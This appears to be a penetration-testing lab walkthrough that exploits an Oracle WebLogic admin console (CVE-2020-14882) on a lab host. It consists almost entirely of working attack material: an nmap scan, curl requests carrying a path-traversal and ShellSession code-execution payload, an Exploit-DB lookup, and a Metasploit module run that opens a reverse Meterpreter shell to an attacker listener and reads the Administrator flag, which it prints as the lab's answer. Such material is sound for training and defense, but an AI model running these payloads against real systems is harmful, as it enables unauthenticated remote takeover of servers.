# Other Notable Applications

nmap -sV 10.129.201.102

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds?
7001/tcp open  http          Oracle WebLogic admin httpd 12.2.1.3 (T3 enabled)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

curl -k -X "GET" https://10.129.201.102:7001/console/css/%252e%252e%252fconsole.portal

curl -k -X "GET" https://10.129.201.102:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/pentest00ls');")

https://www.exploit-db.com/exploits/49479


searchsploit -p 49479
  Exploit: Oracle WebLogic Server 12.2.1.0 - RCE (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/49479
     Path: /usr/share/exploitdb/exploits/java/webapps/49479.py
    Codes: CVE-2020-14882
 Verified: False
File Type: Python script, ASCII text executable
Copied EDB-ID #49479's path to the clipboard

locate 49479.py
/usr/share/exploitdb/exploits/java/webapps/49479.py

cp /usr/share/exploitdb/exploits/java/webapps/49479.py .

use exploit/multi/http/weblogic_admin_handle_rce

set LHOST 10.10.14.88
set RHOSTS 10.129.201.102
set SRVPORT 7001
run

(Meterpreter 2)(C:\Oracle\Middleware\Oracle_Home\user_pro
jects\domains\base_domain) > shell
Process 1916 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

[*] Started HTTPS reverse handler on https://10.10.14.88:8443
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Path traversal successful.
[*] Executing PowerShell Stager for windows/x64/meterpreter/reverse_https
[!] https://10.10.14.88:8443 handling request from 10.129.201.102; (UUID: akxurtu0) Without a database connected that payload UUID tracking will not work!

C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain>type c:\Users\Administrator\Desktop\flag.txt
type c:\Users\Administrator\Desktop\flag.txt
w3b_l0gic_RCE!
